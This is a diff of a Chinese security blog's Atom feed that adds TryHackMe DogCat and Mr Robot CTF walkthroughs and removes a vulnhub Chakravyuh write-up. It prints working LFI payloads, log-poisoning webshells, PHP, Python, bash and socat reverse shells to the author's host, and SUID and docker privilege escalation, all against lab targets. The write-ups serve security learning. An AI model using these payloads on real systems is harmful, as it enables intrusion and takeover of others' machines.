@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="/"/>
-  <updated>2020-07-02T07:58:23.235Z</updated>
+  <updated>2020-07-28T08:57:08.384Z</updated>
   <id>/</id>
   
   <author>
@@ -15,6 +15,52 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>TryHackMe DogCat</title>
+    <link href="/2020/07/TryHackMe-DogCat/"/>
+    <id>/2020/07/TryHackMe-DogCat/</id>
+    <published>2020-07-28T08:57:08.000Z</published>
+    <updated>2020-07-28T08:57:08.384Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="dogcat"><a href="#dogcat" class="headerlink" title="dogcat"></a>dogcat</h2><p>来自tryhackme的一个靶场，启动环境后在80端口上访问到一个web服务，点击查看是一个显示动物图片的功能。</p><pre><code>http://10.10.175.143/?view=dog</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200724140132214.png" alt="image-20200724140132214"></p><p>给参数来个单引号查看变化，发现报错，并且从报错上看，明显是文件读取拼接文件后缀名，所以此处可能存在一个文件读取漏洞。</p><pre><code>http://10.10.175.143/?view=dog%27</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200724140621351.png" alt="image-20200724140621351"></p><p>再尝试添加一个%00来截断后缀，发现没有后缀显示，应该是已经截断。</p><pre><code>http://10.10.175.143/?view=dog%27%00</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200724140728518.png" alt="image-20200724140728518"></p><p>尝试读取本地文件的时候发现只能读取dog和cat的文件，猜测可能是由于判断请求中是否含有相关字段</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200724141429734.png" alt="image-20200724141429734"></p><p>再%00后面添加dog字段发现可以绕过，说明是判断是否存在字符串，只不过发现读取文件的时候并不能正常读取。include_path在任何文件中都可以直接引入该目录下文件，被包含文件先按参数给出的路径寻找，如果没有给出目录（只有文件名）时则按照include_path指定的目录寻找</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200724142635527.png" alt="image-20200724142635527"></p><p>绕了一圈发现是错误是文件读取上的错误，不能识别文件，说明截断失败，再关注一下php版本发现是7系统，php已经修复%00的文件截断。所以需要一个不截断正常去读取的操作，没有在意php版本导致绕一圈。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200724152733228.png" alt="image-20200724152733228"></p><p>调用的时候发现一个报错是多次调用导致重复声明，说明index包含很可能是成功的。</p><p>利用php协议来读取文件，尝试php://filter，可以读取到文件内容</p><pre><code>/?view=php://filter/read=convert.base64-encode/resource=dog/../index</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200724153220725.png" alt="image-20200724153220725"></p><p>解码后index的内容为</p><pre><code>&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;dogcat&lt;/title&gt;    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/style.css&quot;&gt;&lt;/head&gt;&lt;body&gt;    &lt;h1&gt;dogcat&lt;/h1&gt;    &lt;i&gt;a gallery of various dogs or cats&lt;/i&gt;    &lt;div&gt;        &lt;h2&gt;What would you like to see?&lt;/h2&gt;        &lt;a href=&quot;/?view=dog&quot;&gt;&lt;button id=&quot;dog&quot;&gt;A dog&lt;/button&gt;&lt;/a&gt; &lt;a href=&quot;/?view=cat&quot;&gt;&lt;button id=&quot;cat&quot;&gt;A cat&lt;/button&gt;&lt;/a&gt;&lt;br&gt;        &lt;?php            function containsStr($str, $substr) {                return strpos($str, $substr) !== false;            }        $ext = isset($_GET[&quot;ext&quot;]) ? $_GET[&quot;ext&quot;] : &#39;.php&#39;;            if(isset($_GET[&#39;view&#39;])) {                if(containsStr($_GET[&#39;view&#39;], &#39;dog&#39;) || containsStr($_GET[&#39;view&#39;], &#39;cat&#39;)) {                    echo &#39;Here you go!&#39;;                    include $_GET[&#39;view&#39;] . $ext;                } else {                    echo &#39;Sorry, only dogs or cats are allowed.&#39;;                }            }        ?&gt;    &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>存在一个参数ext是获取后缀的，判断是否存在后缀，存在的话拼接参数后缀，构造一个文件读取为地址，也可以ext置为空。</p><pre><code>/?view=/dog/../etc/&amp;ext=passwd/?view=/dog/../etc/passwd&amp;ext=</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200724153512101.png" alt="image-20200724153512101"></p><p>然后现在需要考虑的就是如果把本地文件读取来获取rce。</p><p>想试一下从<code>/proc/self/environ</code>来获取，发现文件没有权限，尝试别的目录，发现可以读取日志。</p><pre><code>/?view=/dog/../var/log/apache2/access.log&amp;ext=&amp;aaa=&lt;?=phpinfo();?&gt;</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200724155056684.png" alt="image-20200724155056684"></p><p>由于使用bp的时候编码和特殊符号会导致写入错误，所以使用curl写一句话</p><pre><code>curl -v &quot;http://10.10.136.89/&lt;?php system($_GET\[&#39;cmd&#39;\]);?&gt;&quot;</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200724173648127.png" alt="image-20200724173648127"></p><p>反弹一个shell回来</p><pre><code>php+-r+&#39;$sock=fsockopen(&quot;10.6.xx.xx&quot;,8877);exec(&quot;/bin/sh+-i+&lt;%263+&gt;%263+2&gt;%263&quot;);&#39;</code></pre><p>获取权限后，查看一下sudo权限，env命令可以显示当前用户的环境变量</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200727153957529.png" alt="image-20200727153957529"></p><p>利用<code>sudo env /bin/bash</code>获取一个root权限</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200727154232251.png" alt="image-20200727154232251"></p><p>搜了一圈发现只有三个flag，flag4并不在，查了一下根目录发现<code>.dockerenv</code>，这是个docker环境，所以可能需要docker逃逸一下？</p><p>先升级一个可交互的shell来操作，docker不带python环境和socat，所以先传一个socat上去。主机不带wget，使用curl</p><pre><code>curl -o socat http://10.6.xx.xx:8000/socat</code></pre><p>再docker上执行</p><pre><code>./socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp:10.6.xx.xx:4444</code></pre><p>在自己监听主机上执行</p><pre><code>./socat file:`tty`,raw,echo=0 tcp-listen:4444</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200727155322648.png" alt="image-20200727155322648"></p><p>再试一手CVE-2016-5195，<a href="https://github.com/scumjr/dirtycow-vdso" target="_blank" rel="noopener">https://github.com/scumjr/dirtycow-vdso</a></p><p>发现还是不行，查看一下系统上有没有可以利用的文件</p><p>在<code>/opt/</code>下找到一个backups目录，里面有一个备份的sh脚本。执行的是/root/container目录的备份，但是docker主机并没有这个目录，所以可能是外部主机上的目录。尝试修改反弹shell</p><pre><code>echo &quot;bash -i &gt;&amp; /dev/tcp/10.6.xx.xx/8855 0&gt;&amp;1&quot; &gt; /opt/backups/backup.sh</code></pre><p>里面的tar包也可以看到。确实是docker的web代码。寻思可能是外部主机上的定时脚本，不过等了半天也没反应。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;dogcat&quot;&gt;&lt;a href=&quot;#dogcat&quot; class=&quot;headerlink&quot; title=&quot;dogcat&quot;&gt;&lt;/a&gt;dogcat&lt;/h2&gt;&lt;p&gt;来自tryhackme的一个靶场，启动环境后在80端口上访问到一个web服务，点击查看是一个显示动物图片的功
+      
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>TryHackMe Mr Robot</title>
+    <link href="/2020/07/TryHackMe-Mr-Robot/"/>
+    <id>/2020/07/TryHackMe-Mr-Robot/</id>
+    <published>2020-07-28T08:56:29.000Z</published>
+    <updated>2020-07-28T08:56:29.554Z</updated>
+    
+    <content type="html"><![CDATA[<p>来自tryhackme的Mr Robot CTF</p><p>访问首页是一个命令行执行页面，其实也没多大用，就是输出命令显示相关的东西。随便输入一个地址报错，显示是一个wordpress的站点，4.3.1的版本。</p><pre><code>http://10.10.188.224/http:/10.10.188.224/</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200728135544303.png" alt="image-20200728135544303"></p><p>然后查找一个其他页面是否有别的信息。</p><pre><code>python dirbrute.py http://10.10.188.224/ -t 20 -d ./dics/DirBuster/directory-list-2.3-medium.txt</code></pre><p>查找到部分信息</p><pre><code>http://10.10.188.224/sitemaphttp://10.10.188.224/rsshttp://10.10.188.224/loginhttp://10.10.188.224/feedhttp://10.10.188.224/0http://10.10.188.224/atomhttp://10.10.188.224/imagehttp://10.10.188.224/wp-contenthttp://10.10.188.224/adminhttp://10.10.188.224/introhttp://10.10.188.224/wp-loginhttp://10.10.188.224/rss2http://10.10.188.224/licensehttp://10.10.188.224/Imagehttp://10.10.188.224/rdfhttp://10.10.188.224/page1http://10.10.188.224/readmehttp://10.10.188.224/robots......</code></pre><p>其中robots文件中提示我们有两个文件</p><pre><code>fsocity.dickey-1-of-3.txt</code></pre><p>其中<code>key-1-of-3.txt</code>就是我们需要的第一个key。另一个文件看起来像是个字典，可能是需要爆破后面的登陆账号密码，现在需要一个账号。先用这个字典爆破一个账号，在密码找回的地方，找到一个<code>Elliot</code>用户。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200728151142975.png" alt="image-20200728151142975"></p><p>然后再去爆破密码，原字典里发现有不少重复的单词，去重后发现数量少了一大半，就这是用来消耗你时间的啊？</p><p>使用在线去重：<a href="https://tool.lanrentuku.com/quchong/，发现只剩一万多条数据。经过漫长的爆破，发现密码为" target="_blank" rel="noopener">https://tool.lanrentuku.com/quchong/，发现只剩一万多条数据。经过漫长的爆破，发现密码为</a></p><p><code>ER28-0652</code>，登陆后台。</p><p>同过后台上传插件，上传一个php文件，虽然会显示上传失败，但是文件已经上传</p><pre><code>http://10.10.188.224/wp-content/uploads/2020/07/1.php</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200728162306251.png" alt="image-20200728162306251"></p><p>上传的是一句话，使用蚁剑连接即可。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200728162409252.png" alt="image-20200728162409252"></p><p>为了方便操作命令，反弹一个shell回来。</p><pre><code>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;10.6.4.191\&quot;,8089));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&#39;</code></pre><p>反弹回来后，利用<code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code>来升级shell模式。</p><p>在<code>/home/robot</code>目录下发现一个文件，其中包含的<code>robot:c3fcd3d76192e4007dfb496cca67e13b</code>解密是<code>abcdefghijklmnopqrstuvwxyz</code>，用户robot的密码可能就是这个。</p><p>更改到这个用户后，目录下就有我们需要的第二个key。</p><p>然后使用此用户提权，先查看一个SUID文件，<code>find / -user root -perm -4000 -print 2&gt;/dev/null</code></p><p>结果中看到这个文件，nmap在版本低于5.21的时候，可以提权</p><pre><code>/usr/local/bin/nmap  nmap version 3.81</code></pre><p>利用nmap提权获取root：</p><pre><code>robot@linux:~$ nmap --interactivenmap --interactiveStarting nmap V. 3.81 ( http://www.insecure.org/nmap/ )Welcome to Interactive Mode -- press h &lt;enter&gt; for helpnmap&gt; !sh!sh# ididuid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)#</code></pre><p>在root目录下就可以看到<code>firstboot_done</code>文件和最后一个key，到此就算是结束了。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;来自tryhackme的Mr Robot CTF&lt;/p&gt;
+&lt;p&gt;访问首页是一个命令行执行页面，其实也没多大用，就是输出命令显示相关的东西。随便输入一个地址报错，显示是一个wordpress的站点，4.3.1的版本。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;http://10.10.1
+      
+    
+    </summary>
+    
+    
+      <category term="web安全" scheme="/tags/web%E5%AE%89%E5%85%A8/"/>
+    
+  </entry>
   
   <entry>
     <title>又叒叒一个基于osquery的监控</title>
@@ -439,59 +485,6 @@
     
     
       <category term="Android逆向" scheme="/tags/Android%E9%80%86%E5%90%91/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Linux主机安全检查脚本</title>
-    <link href="/2019/11/Linux%E4%B8%BB%E6%9C%BA%E5%AE%89%E5%85%A8%E6%A3%80%E6%9F%A5%E8%84%9A%E6%9C%AC/"/>
-    <id>/2019/11/Linux主机安全检查脚本/</id>
-    <published>2019-11-22T07:36:57.000Z</published>
-    <updated>2019-11-22T07:42:57.493Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="检查项"><a href="#检查项" class="headerlink" title="检查项"></a>检查项</h3><pre><code>0.检测命令是否被修改1.获取网络连接2.查看对外开放端口3.查看是否存在高危端口4.查看启动项5.查看定时任务6.查看调度任务7.检测cpu异常进程8.检测特权用户9.查看登陆用户10.可登录用户11.最近修改过的文件12.查看是否存在可疑命令13.root是否允许远程登陆14.检查是否存在可疑脚本15.日志文件打包16.查看登陆到主机的用户17.检查磁盘使用量</code></pre><p>以上检查项按照比较关心的项来写，在Ubuntu主机上测试，个别命令可能centos不带，需要提前安装。</p><h3 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h3><p>项目地址：<a href="https://github.com/MisakiKata/Linuxcheck" target="_blank" rel="noopener">https://github.com/MisakiKata/Linuxcheck</a></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>其中还包括一批后门端口，利用来自：<a href="https://github.com/T0xst/linux/blob/master/checkrules/dangerstcpports.dat" target="_blank" rel="noopener">port列表</a></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h3 id=&quot;检查项&quot;&gt;&lt;a href=&quot;#检查项&quot; class=&quot;headerlink&quot; title=&quot;检查项&quot;&gt;&lt;/a&gt;检查项&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;0.检测命令是否被修改
-1.获取网络连接
-2.查看对外开放端口
-3.查看是否存在高危端口
-4.查看启动项
-5.查看定
-      
-    
-    </summary>
-    
-    
-      <category term="shell" scheme="/tags/shell/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>vulnhub Chakravyuh</title>
-    <link href="/2019/11/vulnhub-Chakravyuh/"/>
-    <id>/2019/11/vulnhub-Chakravyuh/</id>
-    <published>2019-11-15T07:15:22.000Z</published>
-    <updated>2019-11-25T09:30:06.073Z</updated>
-    
-    <content type="html"><![CDATA[<p>修改网络连接方式为DHCP</p><p>按照虚拟机网段查找分配的IP，此处分配的IP为192.168.120.138</p><h2 id="信息发现"><a href="#信息发现" class="headerlink" title="信息发现"></a>信息发现</h2><p>按照惯例，首先把主机开放端口扫描，发现开放端口为80、22、65530。其中65530是一个ftp服务，连接发现无密码，文件夹pub下存在一个arjun.7z的压缩包。</p><p><img src="https://i.loli.net/2019/11/15/skYyTa64x5tFiwp.png" alt="1573710199259.png"></p><p>访问80端口，就一张图片，扫描路径，发现phpmyadmin。无空密码。</p><p><img src="https://i.loli.net/2019/11/15/BSExeVdhqk5K8jX.png" alt="1573710258221.png"></p><p><img src="https://i.loli.net/2019/11/15/7UdzvtM8eFGWHrh.png" alt="1573710267644.png"></p><h3 id="爆破压缩包"><a href="#爆破压缩包" class="headerlink" title="爆破压缩包"></a>爆破压缩包</h3><p>到此，需要一个能登陆phpmyadmin的账号密码。尝试爆破7z压缩包。利用一个小脚本爆破。</p><p>根据脚本的建议，需要一份字典，<code>rockyou</code> or <code>crackstation</code>。是kali上的字典，但是手头没有kali。直接搜索下载。</p><p><a href="https://www.scrapmaker.com/download/data/wordlists/dictionaries/rockyou.txt" target="_blank" rel="noopener">https://www.scrapmaker.com/download/data/wordlists/dictionaries/rockyou.txt</a></p><p>爆破是贼慢，但是密码成功出来了，是family。打开是一个secret.txt文件，里面有一个类似base64加密的字符串。</p><p><img src="https://i.loli.net/2019/11/15/rden5chWPaXNmzH.png" alt="1573716758046.png"></p><p>字符串为以下，看起来是账号：邮箱：密码。不过遗憾的是，并不能登陆phpmyadmin。那这个字符串就可能是字段：账号：密码的形式。</p><pre><code>Z2lsYTphZG1pbkBnbWFpbC5jb206cHJpbmNlc2E=解码为：gila:admin@gmail.com:princesa</code></pre><h2 id="利用已知漏洞"><a href="#利用已知漏洞" class="headerlink" title="利用已知漏洞"></a>利用已知漏洞</h2><p>后来试一下路径，发现存在这个一个地址，gila是一个cms。</p><pre><code>http://192.168.120.138/gila/</code></pre><p><img src="https://i.loli.net/2019/11/15/C3tO6HmuqhbzSZj.png" alt="1573788590873.png"><br>到官方网站，找到了官方给的demo站，后台地址是加admin。尝试是否也是admin。</p><pre><code>http://192.168.120.138/gila/admin</code></pre><p><img src="https://i.loli.net/2019/11/15/j2xpDA1v7XqBkoT.png" alt="1573788693246.png"></p><p>登陆后，看到版本为1.10.9。基本可以确定是一个后台获取webshell的利用方式，搜索谷歌，查找一下是否有已知的漏洞。在exploit-db上找到了一个本地文件包含漏洞。尝试确实存在，而已可以上传文件。查看一下发现是content下的文件管理功能。</p><pre><code>http://192.168.120.138/gila/admin/fm?f=./..</code></pre><p><img src="https://i.loli.net/2019/11/15/ig9yuJs3EHr7mpS.png" alt="1573788989941.png"></p><h3 id="利用上传文件"><a href="#利用上传文件" class="headerlink" title="利用上传文件"></a>利用上传文件</h3><p>创建新文件后门。在assert文件夹下，但是php文件不能访问，需要修改.htaccess文件。</p><p><img src="https://i.loli.net/2019/11/15/HpAKf6RXyNrShJ2.png" alt="1573789346619.png"></p><p>修改为<code>Allow from all</code>，即可访问上传的文件。</p><p><img src="https://i.loli.net/2019/11/15/2jIiJDk3G4yagWz.png" alt="1573789391147.png"></p><h2 id="反弹shell获取权限"><a href="#反弹shell获取权限" class="headerlink" title="反弹shell获取权限"></a>反弹shell获取权限</h2><p>利用php反弹shell</p><pre><code>php -r &#39;$sock=fsockopen(&quot;192.168.30.79&quot;,8080);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;#升级shellpython -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39; </code></pre><p><img src="https://i.loli.net/2019/11/15/L7qnsAzGgY3T9df.png" alt="1573798182649.png"></p><p>从id命令看到www-data是docker组的成员，而docker是可以免密码操作sudo的。详细参考</p><p><a href="https://www.freebuf.com/articles/system/170783.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/170783.html</a></p><p>借助一个docker镜像，查看本机存在一个alpine镜像</p><p><img src="https://i.loli.net/2019/11/15/QkOp8Kcxt6MnfBP.png" alt="1573799916611.png"></p><p>采用-v的目录映射，此处修改为/root:/root，运行进入docker内部</p><pre><code>docker run -it --rm -v /root:/root alpine</code></pre><p><img src="https://i.loli.net/2019/11/15/192nqWMVgFcBtrS.png" alt="1573800551863.png"></p><p>找到root下的文件，打开即可</p><p><img src="https://i.loli.net/2019/11/15/bBqVHw2TS7k3smR.png" alt="1573800574456.png"></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;修改网络连接方式为DHCP&lt;/p&gt;
-&lt;p&gt;按照虚拟机网段查找分配的IP，此处分配的IP为192.168.120.138&lt;/p&gt;
-&lt;h2 id=&quot;信息发现&quot;&gt;&lt;a href=&quot;#信息发现&quot; class=&quot;headerlink&quot; title=&quot;信息发现&quot;&gt;&lt;/a&gt;信息发现&lt;/h
-      
-    
-    </summary>
-    
-    
-      <category term="渗透测试" scheme="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
     
   </entry>
   
